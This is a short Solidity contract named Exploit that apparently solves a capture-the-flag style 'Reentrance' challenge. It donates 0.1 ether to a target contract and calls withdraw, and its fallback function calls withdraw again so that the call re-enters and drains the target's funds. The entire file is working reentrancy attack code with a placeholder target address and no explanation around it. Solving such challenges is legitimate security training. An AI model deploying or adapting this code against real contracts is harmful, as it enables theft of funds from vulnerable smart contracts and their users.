import './Reentrance.sol';
contract Exploit {
    address target = 0x...;
    Reentrance c;
    function Exploit() payable {
       c = Reentrance(target);
       c.donate.value(0.1 ether)(this);
       c.withdraw(0.1 ether); 
    }
    
    function() payable {
        c.withdraw(0.1 ether);
    }
}